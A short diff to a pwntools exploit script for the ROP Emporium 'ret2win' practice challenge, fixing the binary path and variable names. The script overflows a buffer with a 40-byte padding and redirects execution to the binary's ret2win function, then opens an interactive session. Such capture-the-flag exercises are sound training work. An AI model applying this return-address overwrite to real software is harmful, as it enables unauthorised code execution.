@@ -1,16 +1,16 @@
 from pwn import * 
 
-bin= '/home/kali/Downloads/ropemporium/challenge1/ret2win'
+bin= '/home/kali/Downloads/ropemporium/challenge1/x64/ret2win'
 bin= ELF(bin)
-context.binary= binary
+context.binary= bin
 context.log_level='info'
 
 offset= 40
 
-ret2win= binary.symbols['ret2win']
+ret2win= bin.symbols['ret2win']
 
 payload= flat(b'A'* offset, ret2win)
 
 p=process(bin.path)
-p.sendline(payload)
+p.send(payload)
 p.interactive()
